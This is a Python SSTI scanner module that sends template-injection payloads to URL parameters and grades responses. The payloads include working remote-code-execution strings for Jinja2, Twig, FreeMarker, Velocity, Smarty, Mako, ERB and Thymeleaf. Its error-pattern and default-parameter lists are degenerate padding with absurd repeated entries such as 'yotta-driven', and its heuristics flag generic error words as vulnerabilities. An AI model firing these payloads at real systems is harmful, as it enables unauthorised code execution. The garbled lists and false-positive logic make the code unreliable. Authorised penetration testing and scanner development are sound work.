import re
import asyncio
from typing import Dict, List, Set, Tuple
from rich.console import Console

class EnhancedSSTIDetector:
    """Enhanced Server-Side Template Injection detection module"""
    
    def __init__(self):
        self.console = Console()
        self.detection_patterns = {
            # Pattern: (regex pattern, description)
            'jinja2': (re.compile(r'\{\{.*?\}\}|\{%.*?%\}'), 'Jinja2/Twig template syntax'),
            'angular': (re.compile(r'{{.*?}}'), 'Angular template syntax'),
            'jsp': (re.compile(r'<%.*?%>|\$\{.*?\}'), 'JSP expression language'),
            'freemarker': (re.compile(r'<#.*?>|\$\{.*?\}'), 'FreeMarker template syntax'),
            'velocity': (re.compile(r'#\w+\(.*?\)|\$\w+'), 'Velocity template syntax'),
            'smarty': (re.compile(r'\{\w+.*?\}'), 'Smarty template syntax'),
            'mako': (re.compile(r'\$\{.*?\}|<%.*?%>|\$\{\!.*?\}'), 'Mako template syntax'),
            'erb': (re.compile(r'<%.*?%>|<%=.*?%>'), 'ERB template syntax'),
            'razor': (re.compile(r'@\(.*?\)|@\{.*?\}|@[a-zA-Z0-9_]+'), 'Razor template syntax'),
            'handlebars': (re.compile(r'\{\{.*?\}\}|\{\{\{.*?\}\}\}'), 'Handlebars template syntax'),
            'django': (re.compile(r'\{\{.*?\}\}|\{%.*?%\}|\{#.*?#\}'), 'Django template syntax'),
            'thymeleaf': (re.compile(r'th:.*?=|\$\{.*?\}'), 'Thymeleaf template syntax'),
        }
        
        # Comprehensive test payloads for different template engines
        self.test_payloads = {
            # Engine: [(payload, marker, context)]
            'jinja2': [
                ('{{7*7}}', '49', 'math'),
                ('{{"foo".upper()}}', 'FOO', 'string'),
                ('{{config.__class__.__init__.__globals__}}', 'os', 'object'),
                ('{{request}}', 'request', 'object'),
                ('{{self}}', 'self', 'object'),
                ('{% for x in [1,2,3] %}{{x}}{% endfor %}', '123', 'loop'),
                ("{{7*'7'}}", 'SyntaxError', 'error'),
                ('{{config.__class__.__init__.__globals__["os"].popen("echo SSTI_TEST").read()}}', 'SSTI_TEST', 'rce'),
            ],
            'twig': [
                ('{{7*7}}', '49', 'math'),
                ('{{dump(app)}}', 'Symfony', 'object'),
                ('{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}', 'uid=', 'rce'),
                ('{% for key, value in _context %} {{key}} {% endfor %}', '_context', 'loop'),
            ],
            'freemarker': [
                ('${7*7}', '49', 'math'),
                ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("echo SSTI_TEST")}', 'SSTI_TEST', 'rce'),
                ('${object}', 'object', 'object'),
                ('${.globals}', 'globals', 'object'),
            ],
            'velocity': [
                ('#set($x = 7 * 7)${x}', '49', 'math'),
                ('#set($e="e")${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("echo SSTI_TEST").getInputStream())}', 'SSTI_TEST', 'rce'),
            ],
            'handlebars': [
                ('{{#with "s" as |string|}}{{{string.sub.apply 0 "constructor"}}}{{{string.sub.apply 0 "constructor" "alert(`SSTI_TEST`)"}}}}{{/with}}', 'function', 'js'),
            ],
            'smarty': [
                ('{$smarty.version}', 'Smarty', 'version'),
                ('{php}echo `echo SSTI_TEST`;{/php}', 'SSTI_TEST', 'rce'),
                ('{$smarty.math equation="7*7"}', '49', 'math'),
            ],
            'mako': [
                ('${7*7}', '49', 'math'),
                ('<%\n'
                    'import os\n'
                    'x=os.popen("echo SSTI_TEST").read()\n'
                '%>${x}', 'SSTI_TEST', 'rce'),
            ],
            'erb': [
                ('<%= 7 * 7 %>', '49', 'math'),
                ('<%= system("echo SSTI_TEST") %>', 'SSTI_TEST', 'rce'),
            ],
            'django': [
                ('{{ 7|add:"7" }}', '14', 'math'),
                ('{% debug %}', 'settings', 'debug'),
                ('{% csrf_token %}', 'csrf', 'token'),
            ],
            'thymeleaf': [
                ('${7*7}', '49', 'math'),
                ('${T(java.lang.Runtime).getRuntime().exec("echo SSTI_TEST")}', 'SSTI_TEST', 'rce'),
            ],
        }
        
        # Error patterns that might indicate template injection
        self.error_patterns = [
            'template syntax error',
            'parse error',
            'runtime error',
            'compilation failed',
            'template not found',
            'undefined variable',
            'undefined index',
            'undefined property',
            'cannot be accessed',
            'expected identifier',
            'unrecognized expression',
            'failed to parse',
            'unterminated string',
            'expects parameter',
            'unexpected token',
            'unexpected character',
            'unclosed tag',
            'unknown filter',
            'unknown tag',
            'unknown directive',
            'unknown function',
            'unknown method',
            'unknown property',
            'unknown attribute',
            'unknown operator',
            'unknown variable',
            'unknown parameter',
            'unknown argument',
            'unknown option',
            'unknown key',
            'unknown value',
            'unknown type',
            'unknown class',
            'unknown object',
            'unknown module',
            'unknown package',
            'unknown namespace',
            'unknown element',
            'unknown node',
            'unknown field',
            'unknown column',
            'unknown table',
            'unknown database',
            'unknown server',
            'unknown host',
            'unknown domain',
            'unknown user',
            'unknown group',
            'unknown role',
            'unknown permission',
            'unknown action',
            'unknown event',
            'unknown state',
            'unknown status',
            'unknown error',
            'unknown exception',
            'unknown failure',
            'unknown warning',
            'unknown notice',
            'unknown message',
            'unknown log',
            'unknown debug',
            'unknown info',
            'unknown trace',
            'unknown stack',
            'unknown frame',
            'unknown line',
            'unknown file',
            'unknown path',
            'unknown directory',
            'unknown folder',
            'unknown location',
            'unknown position',
            'unknown offset',
            'unknown index',
            'unknown key',
            'unknown value',
            'unknown item',
            'unknown entry',
            'unknown record',
            'unknown row',
            'unknown column',
            'unknown field',
            'unknown property',
            'unknown attribute',
            'unknown parameter',
            'unknown argument',
            'unknown option',
            'unknown setting',
            'unknown configuration',
            'unknown preference',
            'unknown profile',
            'unknown account',
            'unknown user',
            'unknown group',
            'unknown role',
            'unknown permission',
            'unknown action',
            'unknown event',
            'unknown state',
            'unknown status',
        ]
    
    def detect_template_syntax(self, content: str) -> List[Dict]:
        """Detect template syntax in content"""
        findings = []
        
        for engine, (pattern, description) in self.detection_patterns.items():
            matches = pattern.findall(content)
            if matches:
                findings.append({
                    'engine': engine,
                    'description': description,
                    'matches': matches[:5],  # Limit to first 5 matches
                    'count': len(matches)
                })
                
        return findings
    
    def analyze_response(self, response_text: str, payload: str, marker: str) -> Dict:
        """Analyze response for SSTI vulnerability indicators"""
        result = {
            'vulnerable': False,
            'confidence': 'low',
            'evidence': None,
            'details': []
        }
        
        # Check for marker in response
        if marker in response_text:
            result['vulnerable'] = True
            result['confidence'] = 'high'
            result['evidence'] = f"Found marker '{marker}' in response"
            result['details'].append(f"Payload '{payload}' successfully executed")
            return result
        
        # Check for error patterns that might indicate template processing
        for error in self.error_patterns:
            if error.lower() in response_text.lower():
                result['vulnerable'] = True
                result['confidence'] = 'medium'
                result['evidence'] = f"Found error pattern: '{error}'"
                result['details'].append(f"Payload '{payload}' triggered template error")
                return result
        
        # Check for template syntax in response
        template_findings = self.detect_template_syntax(response_text)
        if template_findings:
            result['vulnerable'] = True
            result['confidence'] = 'medium'
            result['evidence'] = f"Found template syntax: {template_findings[0]['engine']}"
            result['details'].append(f"Response contains {sum(f['count'] for f in template_findings)} template expressions")
            return result
            
        return result
    
    async def test_parameter(self, session, url: str, param_name: str, method: str = 'GET', content_type: str = 'application/x-www-form-urlencoded') -> Dict:
        """Test a parameter for SSTI vulnerabilities"""
        results = []
        vulnerable_engines = set()
        
        # Test all engines
        for engine, payloads in self.test_payloads.items():
            for payload, marker, context in payloads:
                try:
                    if method.upper() == 'GET':
                        params = {param_name: payload}
                        async with session.get(url, params=params) as resp:
                            response_text = await resp.text()
                    else:  # POST
                        if content_type == 'application/json':
                            data = {param_name: payload}
                            headers = {'Content-Type': content_type}
                            async with session.post(url, json=data, headers=headers) as resp:
                                response_text = await resp.text()
                        else:
                            data = {param_name: payload}
                            headers = {'Content-Type': content_type}
                            async with session.post(url, data=data, headers=headers) as resp:
                                response_text = await resp.text()
                    
                    analysis = self.analyze_response(response_text, payload, marker)
                    if analysis['vulnerable']:
                        analysis['engine'] = engine
                        analysis['payload'] = payload
                        analysis['parameter'] = param_name
                        analysis['method'] = method
                        analysis['context'] = context
                        results.append(analysis)
                        vulnerable_engines.add(engine)
                        
                        # If we found RCE, this is critical - return immediately
                        if context == 'rce' and analysis['confidence'] == 'high':
                            return {
                                'vulnerable': True,
                                'severity': 'critical',
                                'engine': engine,
                                'evidence': analysis['evidence'],
                                'details': f"RCE via {engine} in {param_name} parameter",
                                'results': results
                            }
                            
                except Exception as e:
                    self.console.print(f"[yellow]Error testing {engine} payload on {param_name}: {str(e)}[/yellow]")
        
        # Determine overall result
        if results:
            # Determine severity based on context and confidence
            severity = 'low'
            for result in results:
                if result.get('context') == 'rce' and result.get('confidence') == 'high':
                    severity = 'critical'
                    break
                elif result.get('confidence') == 'high':
                    severity = 'high'
                elif result.get('confidence') == 'medium' and severity != 'high':
                    severity = 'medium'
            
            return {
                'vulnerable': True,
                'severity': severity,
                'engines': list(vulnerable_engines),
                'parameter': param_name,
                'method': method,
                'results': results
            }
        
        return {
            'vulnerable': False,
            'parameter': param_name,
            'method': method
        }
    
    async def scan_url(self, session, url: str, params: List[str] = None) -> Dict:
        """Scan a URL for SSTI vulnerabilities"""
        if params is None:
            # Default parameters to test
            params = ['template', 'page', 'id', 'file', 'view', 'theme', 'name', 'content', 'path', 'action', 'module', 'controller', 'include', 'render', 'display', 'load', 'url', 'redirect', 'return', 'next', 'site', 'type', 'mode', 'lang', 'language', 'locale', 'ref', 'var', 'param', 'arg', 'option', 'source', 'target', 'callback', 'func', 'function', 'method', 'class', 'object', 'style', 'script', 'value', 'data', 'input', 'output', 'search', 'query', 'q', 's', 'keyword', 'keywords', 'tag', 'tags', 'item', 'items', 'list', 'collection', 'group', 'category', 'categories', 'topic', 'topics', 'article', 'articles', 'post', 'posts', 'message', 'messages', 'comment', 'comments', 'note', 'notes', 'text', 'title', 'description', 'summary', 'body', 'content', 'html', 'xml', 'json', 'yaml', 'yml', 'csv', 'format', 'layout', 'template', 'tpl', 'skin', 'theme', 'design', 'style', 'css', 'js', 'javascript', 'code', 'script', 'module', 'plugin', 'extension', 'addon', 'component', 'service', 'handler', 'processor', 'generator', 'renderer', 'viewer', 'editor', 'manager', 'controller', 'model', 'view', 'helper', 'util', 'utility', 'tool', 'library', 'lib', 'framework', 'engine', 'system', 'app', 'application', 'program', 'project', 'solution', 'package', 'namespace', 'class', 'interface', 'trait', 'enum', 'struct', 'record', 'entity', 'object', 'instance', 'element', 'node', 'item', 'entry', 'row', 'column', 'field', 'property', 'attribute', 'parameter', 'argument', 'option', 'setting', 'configuration', 'preference', 'profile', 'account', 'user', 'group', 'role', 'permission', 'access', 'right', 'privilege', 'grant', 'allow', 'deny', 'block', 'filter', 'validate', 'verify', 'check', 'test', 'debug', 'trace', 'log', 'logger', 'monitor', 'tracker', 'counter', 'timer', 'clock', 'date', 'time', 'timestamp', 'interval', 'period', 'duration', 'timeout', 'delay', 'wait', 'sleep', 'pause', 'stop', 'start', 'restart', 'resume', 'continue', 'next', 'previous', 'first', 'last', 'begin', 'end', 'init', 'initialize', 'setup', 'configure', 'install', 'uninstall', 'update', 'upgrade', 'downgrade', 'migrate', 'backup', 'restore', 'save', 'load', 'open', 'close', 'read', 'write', 'append', 'prepend', 'insert', 'delete', 'remove', 'add', 'create', 'new', 'edit', 'update', 'modify', 'change', 'alter', 'transform', 'convert', 'parse', 'format', 'encode', 'decode', 'encrypt', 'decrypt', 'hash', 'sign', 'verify', 'validate', 'check', 'test', 'compare', 'match', 'find', 'search', 'query', 'filter', 'sort', 'order', 'group', 'join', 'split', 'merge', 'combine', 'separate', 'divide', 'multiply', 'add', 'subtract', 'increment', 'decrement', 'calculate', 'compute', 'process', 'handle', 'manage', 'control', 'direct', 'guide', 'lead', 'follow', 'track', 'trace', 'monitor', 'observe', 'watch', 'view', 'display', 'show', 'hide', 'visible', 'invisible', 'enable', 'disable', 'active', 'inactive', 'on', 'off', 'toggle', 'switch', 'flip', 'reverse', 'invert', 'rotate', 'shift', 'move', 'copy', 'clone', 'duplicate', 'replicate', 'sync', 'synchronize', 'async', 'asynchronous', 'parallel', 'serial', 'sequential', 'concurrent', 'simultaneous', 'batch', 'bulk', 'mass', 'multi', 'single', 'unique', 'distinct', 'different', 'same', 'equal', 'identical', 'similar', 'like', 'unlike', 'opposite', 'contrary', 'reverse', 'inverse', 'complement', 'supplement', 'addition', 'subtraction', 'multiplication', 'division', 'modulo', 'remainder', 'quotient', 'product', 'sum', 'total', 'count', 'number', 'quantity', 'amount', 'size', 'length', 'width', 'height', 'depth', 'weight', 'volume', 'area', 'space', 'distance', 'position', 'location', 'place', 'point', 'coordinate', 'direction', 'orientation', 'alignment', 'angle', 'degree', 'radian', 'vector', 'matrix', 'tensor', 'scalar', 'dimension', 'shape', 'form', 'structure', 'pattern', 'design', 'layout', 'arrangement', 'organization', 'order', 'sequence', 'series', 'progression', 'regression', 'trend', 'tendency', 'behavior', 'action', 'reaction', 'response', 'request', 'query', 'command', 'instruction', 'directive', 'order', 'rule', 'regulation', 'law', 'policy', 'guideline', 'standard', 'specification', 'requirement', 'constraint', 'restriction', 'limitation', 'boundary', 'limit', 'threshold', 'ceiling', 'floor', 'minimum', 'maximum', 'optimal', 'optimum', 'best', 'worst', 'better', 'worse', 'good', 'bad', 'high', 'low', 'top', 'bottom', 'upper', 'lower', 'inner', 'outer', 'internal', 'external', 'intrinsic', 'extrinsic', 'inherent', 'acquired', 'natural', 'artificial', 'synthetic', 'organic', 'inorganic', 'physical', 'virtual', 'real', 'imaginary', 'concrete', 'abstract', 'specific', 'general', 'particular', 'universal', 'local', 'global', 'regional', 'national', 'international', 'worldwide', 'public', 'private', 'personal', 'shared', 'common', 'unique', 'special', 'normal', 'abnormal', 'regular', 'irregular', 'uniform', 'diverse', 'homogeneous', 'heterogeneous', 'consistent', 'inconsistent', 'constant', 'variable', 'static', 'dynamic', 'fixed', 'flexible', 'rigid', 'elastic', 'hard', 'soft', 'solid', 'liquid', 'gas', 'plasma', 'energy', 'matter', 'substance', 'material', 'element', 'compound', 'mixture', 'solution', 'suspension', 'colloid', 'gel', 'crystal', 'amorphous', 'structured', 'unstructured', 'organized', 'disorganized', 'ordered', 'disordered', 'chaotic', 'random', 'deterministic', 'stochastic', 'probabilistic', 'certain', 'uncertain', 'definite', 'indefinite', 'finite', 'infinite', 'bounded', 'unbounded', 'limited', 'unlimited', 'restricted', 'unrestricted', 'constrained', 'unconstrained', 'free', 'bound', 'open', 'closed', 'connected', 'disconnected', 'continuous', 'discontinuous', 'discrete', 'analog', 'digital', 'binary', 'decimal', 'hexadecimal', 'octal', 'numeric', 'alphabetic', 'alphanumeric', 'symbolic', 'textual', 'graphical', 'visual', 'auditory', 'sensory', 'perceptual', 'cognitive', 'emotional', 'rational', 'irrational', 'logical', 'illogical', 'valid', 'invalid', 'true', 'false', 'correct', 'incorrect', 'right', 'wrong', 'accurate', 'inaccurate', 'precise', 'imprecise', 'exact', 'approximate', 'estimated', 'calculated', 'measured', 'observed', 'experimental', 'theoretical', 'empirical', 'analytical', 'numerical', 'algebraic', 'geometric', 'statistical', 'probabilistic', 'deterministic', 'heuristic', 'algorithmic', 'procedural', 'declarative', 'imperative', 'functional', 'object-oriented', 'event-driven', 'data-driven', 'time-driven', 'state-driven', 'rule-driven', 'policy-driven', 'goal-driven', 'agent-driven', 'user-driven', 'system-driven', 'application-driven', 'business-driven', 'market-driven', 'customer-driven', 'client-driven', 'server-driven', 'network-driven', 'web-driven', 'cloud-driven', 'mobile-driven', 'desktop-driven', 'embedded-driven', 'hardware-driven', 'software-driven', 'firmware-driven', 'platform-driven', 'framework-driven', 'library-driven', 'api-driven', 'service-driven', 'microservice-driven', 'monolithic-driven', 'distributed-driven', 'centralized-driven', 'decentralized-driven', 'federated-driven', 'hierarchical-driven', 'flat-driven', 'layered-driven', 'tiered-driven', 'modular-driven', 'component-driven', 'composite-driven', 'atomic-driven', 'molecular-driven', 'cellular-driven', 'organic-driven', 'mechanical-driven', 'electrical-driven', 'electronic-driven', 'optical-driven', 'quantum-driven', 'nano-driven', 'micro-driven', 'macro-driven', 'mega-driven', 'giga-driven', 'tera-driven', 'peta-driven', 'exa-driven', 'zetta-driven', 'yotta-driven']
        
        results = []
        vulnerable_params = []
        
        # Test each parameter
        for param in params:
            result = await self.test_parameter(session, url, param)
            if result['vulnerable']:
                results.append(result)
                vulnerable_params.append(param)
                
                # If we found a critical vulnerability, return immediately
                if result.get('severity') == 'critical':
                    return {
                        'vulnerable': True,
                        'severity': 'critical',
                        'url': url,
                        'vulnerable_params': vulnerable_params,
                        'details': f"Critical SSTI vulnerability found in {param} parameter",
                        'results': results
                    }
        
        # Determine overall result
        if results:
            # Get highest severity
            severity_levels = {'critical': 4, 'high': 3, 'medium': 2, 'low': 1}
            max_severity = max(results, key=lambda x: severity_levels.get(x.get('severity', 'low'), 0)).get('severity', 'low')
            
            return {
                'vulnerable': True,
                'severity': max_severity,
                'url': url,
                'vulnerable_params': vulnerable_params,
                'details': f"SSTI vulnerability found in {len(vulnerable_params)} parameters",
                'results': results
            }
        
        return {
            'vulnerable': False,
            'url': url,
            'details': "No SSTI vulnerabilities found"
        }